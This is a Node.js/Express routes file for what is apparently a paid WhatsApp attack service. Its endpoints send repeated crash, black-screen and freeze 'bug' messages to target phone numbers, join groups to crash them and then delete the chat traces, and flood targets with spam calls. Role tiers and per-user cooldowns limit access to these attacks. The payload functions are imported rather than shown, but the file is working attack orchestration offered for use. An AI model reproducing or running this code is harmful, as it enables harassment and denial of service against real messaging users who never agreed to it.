const crypto = require('crypto');
const express = require('express');
const {
  // Core State
  activeConnections,
  biz,
  mess,

  // Session Management - VIP
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,

  // Session Management - Regular
  prepareAuthFolders,
  detectWATypeFromCreds,
  connectSession,
  startUserSessions,
  checkActiveSessionInFolder,

  // Utilities
  disconnectAllActiveConnections,
  sleep,
  isVipOrOwner,

// BUG & ATTACK FUNCTIONS
  crashNotificationVVIP,
  uno,
  forceCloseMentalVVIP,
  invisibleSpam,
  newsw,
  permenCall,
  GroupCrashUi,
  pay,
  xvar,
  CrashUi,
  CallLog,
  BlackScreen,
  freezeClick,
  DelayX,
  kresMamahMu
} = require('../services/whatsappService');
const { loadDatabase, saveDatabase } = require('../services/databaseService');
const { ROLE_COOLDOWNS, MAX_QUANTITIES } = require('../utils/constants');
const { logger } = require('../utils/logger');
const { activeKeys } = require('../middleware/authMiddleware');
const { spamCooldown } = require('../utils/globals');
const path = require('path');
const fs = require('fs');

// Import WhatsApp modules
const { 
  makeWASocket, 
  useMultiFileAuthState, 
  DisconnectReason, 
  fetchLatestBaileysVersion 
} = require("@whiskeysockets/baileys");
const pino = require('pino');

const router = express.Router();

// ... (kode sebelumnya di whatsappRoutes.js)

// Tambahkan import di bagian atas
const { addActivityLog } = require('../services/activityLogService');

// ... kode lainnya tetap sama ...

// Group Bug endpoint - Hanya untuk VIP dan Owner (Single Response)
router.get("/groupBug", async (req, res) => {
  const { key, linkGroup } = req.query;

  // 1. Autentikasi dan Otorisasi
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  // Check role access
  if (!["vip", "owner", "dev"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied. VIP, Owner, or Dev role required." });
  }

  // 2. Validasi Parameter (hanya linkGroup yang diperiksa)
  if (!linkGroup) {
    return res.json({ valid: false, message: "Group link is required" });
  }

  // Ekstrak kode undangan dari link grup
  const match = linkGroup.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) {
    return res.json({ valid: false, message: "Invalid group link format" });
  }
  const inviteCode = match[1];

  // 3. Cek ketersediaan private session
  const userSessions = getUserActiveSessions(user.username);

  if (userSessions.length === 0) {
    return res.json({
      valid: false,
      message: "Private sender unavailable. Please add a sender first."
    });
  }

  // Pilih session acak dari milik pengguna
  const randomSession = userSessions[Math.floor(Math.random() * userSessions.length)];
  const sock = randomSession.sock;
  const sessionName = randomSession.sessionName;

  // 4. Jalankan seluruh proses dan tunggu hingga selesai sebelum merespons
  try {
    const result = await new Promise((resolve, reject) => {
      setImmediate(async () => {
        try {
          logger.info(`[📤 GROUP BUG] Starting process with session ${sessionName} for group ${inviteCode}`);

          let finalResult = {
            success: false,
            canSendMessage: false,
            groupInfo: null,
            error: null
          };

          // 4.1. Bergabung dengan grup
          let groupJid;
          try {
            groupJid = await sock.groupAcceptInvite(inviteCode);
            logger.info(`[✅ GROUP BUG] Successfully joined group: ${groupJid}`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to join group: ${err.message}`);
            finalResult.error = `Failed to join group: ${err.message}`;
            return resolve(finalResult);
          }

          await sleep(3000);

          // 4.2. Ambil metadata grup
          let groupMetadata;
          try {
            groupMetadata = await sock.groupMetadata(groupJid);
            logger.info(`[✅ GROUP BUG] Retrieved group metadata`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to get group metadata: ${err.message}`);
          }

          // 4.3. Coba kirim pesan ke grup
          try {
            await sock.sendMessage(groupJid, { text: "Halo" });
            finalResult.canSendMessage = true;
            logger.info(`[✅ GROUP BUG] Successfully sent message to group`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to send message to group: ${err.message}`);
            logger.info(`[ℹ️ GROUP BUG] Group might have chat disabled`);
          }

          // 4.4. Kirim kombinasi bug yang sudah di-hardcode
          if (finalResult.canSendMessage) {
            try {
              logger.info(`[📤 GROUP BUG] Sending hardcoded bug combination to group`);
              await CrashUi(sock, groupJid);
              await BlackScreen(sock, groupJid);
              await freezeClick(sock, groupJid);
              logger.info(`[✅ GROUP BUG] Successfully sent bug combination to group`);
            } catch (err) {
              logger.error(`[❌ GROUP BUG] Failed to send bug to group: ${err.message}`);
            }
          }

          // 4.5. Keluar dari grup
          try {
            await sock.groupLeave(groupJid);
            logger.info(`[✅ GROUP BUG] Successfully left group: ${groupJid}`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to leave group: ${err.message}`);
          }

          // 4.6. Hapus chat grup dari WhatsApp
          try {
            await sock.chatModify({
              delete: true,
              lastMessages: [{
                key: {
                  remoteJid: groupJid,
                  fromMe: true,
                  id: "1"
                },
                messageTimestamp: Date.now()
              }]
            }, groupJid);
            logger.info(`[✅ GROUP BUG] Successfully deleted group chat`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to delete group chat: ${err.message}`);
          }

          finalResult.success = true;
          if (groupMetadata) {
            finalResult.groupInfo = {
              id: groupMetadata.id,
              subject: groupMetadata.subject,
              desc: groupMetadata.desc,
              owner: groupMetadata.owner,
              creation: groupMetadata.creation,
              participants: groupMetadata.participants.length
            };
          }

          resolve(finalResult);

        } catch (error) {
          logger.error(`[❌ GROUP BUG ERROR] ${error.message}`);
          reject(error);
        }
      });
    });

    res.json(result);

    if (result.success) {
      addActivityLog(user.username, 'Group Bug Attack', {
        groupInviteCode: inviteCode,
        groupInfo: result.groupInfo,
        sessionUsed: sessionName,
        canSendMessage: result.canSendMessage
      });
    } else {
      addActivityLog(user.username, 'Failed Group Bug Attack', {
        groupInviteCode: inviteCode,
        error: result.error,
        sessionUsed: sessionName
      });
    }

  } catch (error) {
    logger.error(`[❌ GROUP BUG FATAL ERROR] ${error.message}`);
    res.json({ valid: false, message: "An internal server error occurred." });

    addActivityLog(user.username, 'Failed Group Bug Attack', {
      groupInviteCode: inviteCode,
      error: error.message,
      sessionUsed: sessionName
    });
  }
});

// Send bug to target
router.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, "");
  logger.info(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logger.info("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    logger.info("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false, message: "User not found" });
  }

  const userIsVipOrOwner = isVipOrOwner(user);
  const role = user.role || "member";
  const cooldownSeconds = ROLE_COOLDOWNS[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    logger.info(`${user.username} Still Cooldown`);

    addActivityLog(user.username, 'Bug Attack - Cooldown', {
      target,
      bugType: bug,
      remainingCooldown: cooldownSeconds - diffSeconds
    });

    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
      message: `Please wait ${cooldownSeconds - diffSeconds} seconds`
    });
  }

  user.lastSend = now;
  saveDatabase(db);
  logger.info(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role,
    message: "Bug attack queued successfully"
  });

  setImmediate(async () => {
    try {
      const sock = await checkActiveSessionInFolder(user.username, userIsVipOrOwner);

      if (!sock) {
        logger.warn(`[❌ BUG] Tidak ada session aktif untuk user ${user.username}`);

        addActivityLog(user.username, 'Failed Bug Attack - No Session', {
          target,
          bugType: bug
        });

        return;
      }

      const targetJid = target + "@s.whatsapp.net";
      logger.info(`[📤 BUG] Menggunakan session untuk mengirim bug ke ${targetJid}`);

      switch (bug) {
        case "crashnotif":
          for (let i = 0; i < 100; i++) {
            await crashNotificationVVIP(sock, targetJid);
            await sleep(2000);
          }
          break;
        case "crashui":
          for (let i = 0; i < 100; i++) {
            await CrashUi(sock, targetJid);
            await DelayX(sock, targetJid);
            await sleep(2000);
          }
          break;

        case "blackscreen":
          for (let i = 0; i < 150; i++) {
            await BlackScreen(sock, targetJid);
            await sleep(2000);
          }
          break;
        case "freezeclick":
          for (let i = 0; i < 105; i++) {
            await freezeClick(sock, targetJid);
            await sleep(2000);
          }
          break;
        case "crashfc":
          for (let i = 0; i < 100; i++) {
            await kresMamahMu(sock, targetJid);
            await sleep(2000);
          }
          break;
        case "all":
          for (let i = 0; i < 100; i++) {
            await CrashUi(sock, targetJid);
            await BlackScreen(sock, targetJid);
            await freezeClick(sock, targetJid);
            await sleep(2000);
          }
          break;
      }

      logger.info(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);

      addActivityLog(user.username, 'Bug Attack', {
        target,
        bugType: bug,
        success: true
      });

    } catch (err) {
      logger.error(`[❌ BUG ERROR] ${err.message}`);

      addActivityLog(user.username, 'Failed Bug Attack', {
        target,
        bugType: bug,
        error: err.message
      });
    }
  });
});

// Spam call to target
router.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  // Check user role access
  if (!user || !["reseller", "owner", "vip", "dev"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const userIsVipOrOwner = isVipOrOwner(user);
  const role = user.role || "member";
  const maxQty = MAX_QUANTITIES[role] || 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  // Dapatkan session aktif
  let bizSessions = [];

  if (userIsVipOrOwner) {
    const vipConnections = getActiveVipConnections();
    for (const [sessionName, sock] of Object.entries(vipConnections)) {
      if (biz[sessionName]) {
        bizSessions.push({
          sessionName: sessionName,
          sock: sock,
          type: "Business",
          isVip: true
        });
      }
    }
  }

  if (bizSessions.length === 0) {
    const userSessions = getUserActiveSessions(user.username);
    bizSessions = userSessions.filter(s => s.type === "Business");
  }

  if (bizSessions.length === 0) {
    return res.json({ valid: false, message: "No business session available" });
  }

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);

    addActivityLog(user.username, 'Spam Call - Cooldown', {
      target,
      quantity: callQty,
      remainingCooldown: remaining
    });

    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
    const randomSession = bizSessions[Math.floor(Math.random() * bizSessions.length)];
    const sock = randomSession.sock;
    const sessionName = randomSession.sessionName;

    await sock.updateBlockStatus(jid, "unblock");
    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    logger.info(`[✅ FIRST SPAM CALL] to ${jid} from ${sessionName}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty, message: "Spam call queued successfully" });

    addActivityLog(user.username, 'Spam Call', {
      target,
      quantity: callQty,
      sessionUsed: sessionName,
      success: true
    });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const randomSession = bizSessions[Math.floor(Math.random() * bizSessions.length)];
          const sock = randomSession.sock;

          await sock.updateBlockStatus(jid, "unblock");
          await sock.offerCall(jid, true);
          await sock.updateBlockStatus(jid, "block");

          logger.info(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${randomSession.sessionName}`);
        } catch (err) {
          logger.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    logger.warn("[❌ FIRST CALL ERROR]", err.message);

    addActivityLog(user.username, 'Failed Spam Call', {
      target,
      quantity: callQty,
      error: err.message
    });

    return res.json({ valid: false, message: "Call failed" });
  }
});

// Custom Bug endpoint - Hanya untuk VIP dan Owner
router.get("/customBug", async (req, res) => {
  const { key, target, bug, qty, delay, senderType } = req.query;

  // 1. Autentikasi dan Otorisasi
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  // Check role access
  if (!["vip", "owner", "dev"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied. VIP, Owner, or Dev role required." });
  }

  // 2. Validasi Parameter
  const cleanTarget = (target || "").replace(/\D/g, "");
  if (!cleanTarget) {
    return res.json({ valid: false, message: "Target is required" });
  }
  if (!bug) {
    return res.json({ valid: false, message: "Bug list is required" });
  }
  if (!["global", "private"].includes(senderType)) {
    return res.json({ valid: false, message: "Invalid senderType. Must be 'global' or 'private'." });
  }

  const bugsToSend = bug.split(',').map(b => b.trim());
  const parsedQty = parseInt(qty) || 1;
  const parsedDelay = parseInt(delay) || 100;

  // 3. Logika berdasarkan SenderType
  let sock, sessionName, maxQty, effectiveDelay;

  if (senderType === "global") {
    maxQty = 10;
    effectiveDelay = 500;
    sock = getRandomVipConnection();

    if (!sock) {
      return res.json({ valid: false, message: "Selected sender type (global) not available right now." });
    }
    sessionName = "VIP Session";
  } else {
    maxQty = 200;
    effectiveDelay = Math.max(parsedDelay, 10);
    const userSessions = getUserActiveSessions(user.username);

    if (userSessions.length === 0) {
      return res.json({ valid: false, message: "Selected sender type (private) not available right now." });
    }
    const randomSession = userSessions[Math.floor(Math.random() * userSessions.length)];
    sock = randomSession.sock;
    sessionName = randomSession.sessionName;
  }

  // 4. Validasi Qty akhir
  if (parsedQty > maxQty) {
    return res.json({
      valid: false,
      message: `Quantity too high. Max allowed for sender type '${senderType}' is ${maxQty}.`
    });
  }

  // 5. Respon sukses segera
  res.json({
    valid: true,
    message: `Attack queued on ${cleanTarget} using ${senderType} sender.`,
    details: {
      target: cleanTarget,
      senderType: senderType,
      bugs: bugsToSend,
      qty: parsedQty,
      delay: effectiveDelay
    }
  });

  // 6. Eksekusi di background
  setImmediate(async () => {
    try {
      const targetJid = `${cleanTarget}@s.whatsapp.net`;
      logger.info(`[📤 CUSTOM BUG] Starting attack on ${targetJid} using ${sessionName} (${senderType})`);

      const bugFunctions = {
        'crashnotif': crashNotificationVVIP,
        'crashui': CrashUi,
        'delayx': DelayX,
        'blackscreen': BlackScreen,
        'freezeclick': freezeClick,
        'uno': uno,
        'pay': pay,
        'xvar': xvar,
        'calllog': CallLog,
        'invisiblespam': invisibleSpam,
        'crashfc': kresMamahMu
      };

      for (let i = 0; i < parsedQty; i++) {
        for (const bugName of bugsToSend) {
          const bugFunction = bugFunctions[bugName];
          if (bugFunction) {
            await bugFunction(sock, targetJid);
            await sleep(effectiveDelay);
          } else {
            logger.warn(`[⚠️ CUSTOM BUG] Unknown bug function: ${bugName}`);
          }
        }
      }
      logger.info(`[✅ CUSTOM BUG] Attack on ${targetJid} completed.`);

      addActivityLog(user.username, 'Custom Bug Attack', {
        target: cleanTarget,
        senderType,
        bugs: bugsToSend,
        quantity: parsedQty,
        delay: effectiveDelay,
        sessionUsed: sessionName,
        success: true
      });

    } catch (err) {
      logger.error(`[❌ CUSTOM BUG ERROR] ${err.message}`);

      addActivityLog(user.username, 'Failed Custom Bug Attack', {
        target: cleanTarget,
        senderType,
        bugs: bugsToSend,
        quantity: parsedQty,
        error: err.message,
        sessionUsed: sessionName
      });
    }
  });
});

// Get active WhatsApp connections
router.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  const userIsVipOrOwner = isVipOrOwner(user);

  let privateConns = [];
  let globalConns = [];

  if (userIsVipOrOwner) {
    const vipConnections = getActiveVipConnections();
    for (const [sessionName, sock] of Object.entries(vipConnections)) {
      const type = biz[sessionName] ? "Business" : (mess[sessionName] ? "Messenger" : "Unknown");
      globalConns.push({
        sessionName: sessionName,
        type: type,
        isActive: true,
        isVip: true,
        owner: "global"
      });
    }
  }

  const userConns = getUserActiveSessions(user.username);

  const safeUserConns = userConns.map(conn => {
    const { sock, ...safeConn } = conn;
    return {
      ...safeConn,
      owner: user.username
    };
  });

  privateConns = [...safeUserConns];

  logger.info(user.username);
  return res.json({
    valid: true,
    connections: {
      private: privateConns,
      global: globalConns
    }
  });
});

// Get pairing code for new WhatsApp session
router.get("/getPairing", async (req, res) => {
  const { key, number, isGlobal } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logger.info("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  if (!number) {
    return res.json({ valid: false, message: "Number is required" });
  }

  const isGlobalSession = isGlobal === 'true';

  try {
    let sessionDir;
    if (isGlobalSession) {
        sessionDir = path.join('vip', number);
        if (!fs.existsSync('vip')) fs.mkdirSync('vip', { recursive: true });
    } else {
        sessionDir = path.join('permenmd', user.username, number);
        if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`, { recursive: true });
    }

    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          logger.info(`🔄 Reconnecting ${number}...`);
          await waiting(3000);
          await pairingWa(number, user.username, 1, isGlobalSession);
        } else {
          delete activeConnections[number];
        }
      } else if (connection === "open") {
         activeConnections[number] = sock;
         const sourceCreds = path.join(sessionDir, 'creds.json');
         let destCreds;

         if (isGlobalSession) {
             destCreds = path.join('vip', `${number}.json`);
         } else {
             destCreds = path.join('permenmd', user.username, `${number}.json`);
         }

         try {
             await waiting(2000);
             if (fs.existsSync(sourceCreds)) {
                 const data = fs.readFileSync(sourceCreds);
                 fs.writeFileSync(destCreds, data);
                 logger.info(`✅ Session saved to ${destCreds}`);
             }
         } catch (e) {
             logger.error(`❌ Failed save session: ${e.message}`);
         }
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(number);
      logger.info(code);
      if (code) {
        return res.json({ valid: true, number, pairingCode: code, message: "Pairing code generated successfully" });
      } else {
        return res.json({ valid: false, message: "Already registered or failed to get code" });
      }
    }
  } catch (err) {
    logger.error("Error in getPairing:", err);
    return res.json({ valid: false, message: err.message });
  }
});

// Helper function to wait
function waiting(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Helper function for pairing WhatsApp
// [MODIFIKASI] Added isGlobal parameter default false
async function pairingWa(number, owner, attempt = 1, isGlobal = false) {
  if (attempt >= 5) {
    return false;
  }
  
  // [MODIFIKASI] Determine path based on isGlobal
  let sessionDir;
  if (isGlobal) {
      sessionDir = path.join('vip', number);
      if (!fs.existsSync('vip')) fs.mkdirSync('vip', { recursive: true });
  } else {
      sessionDir = path.join('permenmd', owner, number); 
      if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd', { recursive: true });
  }

  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        logger.info(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        // [MODIFIKASI] Pass isGlobal recursively
        await pairingWa(number, owner, attempt + 1, isGlobal);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      
      // [MODIFIKASI] Destination path logic
      let destCreds;
      if (isGlobal) {
          destCreds = path.join('vip', `${number}.json`);
      } else {
          destCreds = path.join('permenmd', owner, `${number}.json`);
      }

      try {
        await waiting(3000);
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
          logger.info(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        logger.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

// Helper function to get active connections in a folder
function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
   
  // If folder doesn't exist, return empty array
  if (!fs.existsSync(folderPath)) {
    logger.info(`[DEBUG] Folder ${folderPath} tidak ditemukan`);
    return [];
  }

  // Get all .json files in user folder
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di folder ${subfolderName}`);

  // Loop through each JSON file
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    
    // Check if this session is active in activeConnections
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName,
        isActive: true,
        type: detectWATypeFromCreds(path.join(folderPath, file)) // Add WA type
      });
      
      logger.info(`[DEBUG] Session aktif ditemukan: ${sessionName}`);
    }
  }

  return activeCreds;
}

// FUNGSI INI DIHAPUS KARENA SUDAH DIIMPOR DARI SERVICE
// async function checkActiveSessionInFolder(subfolderName, isVipOrOwnerUser = false) { ... }

// Helper function to get user's active sessions
function getUserActiveSessions(username) {
  const folderPath = path.join('permenmd', username);
   
  // If folder doesn't exist, return empty array
  if (!fs.existsSync(folderPath)) {
    logger.info(`[DEBUG] Folder ${folderPath} tidak ditemukan`);
    return [];
  }

  // Get all .json files in user folder
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const userSessions = [];

  logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di folder ${username}`);

  // Loop through each JSON file
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    
    // Check if this session is active in activeConnections
    if (activeConnections[sessionName]) {
      const credsPath = path.join(folderPath, file);
      const type = detectWATypeFromCreds(credsPath);
      
      userSessions.push({
        sessionName: sessionName,
        sock: activeConnections[sessionName],
        type: type,
        isActive: true
      });
      
      logger.info(`[DEBUG] Session aktif ditemukan: ${sessionName} (${type})`);
    }
  }

  return userSessions;
}

module.exports = router;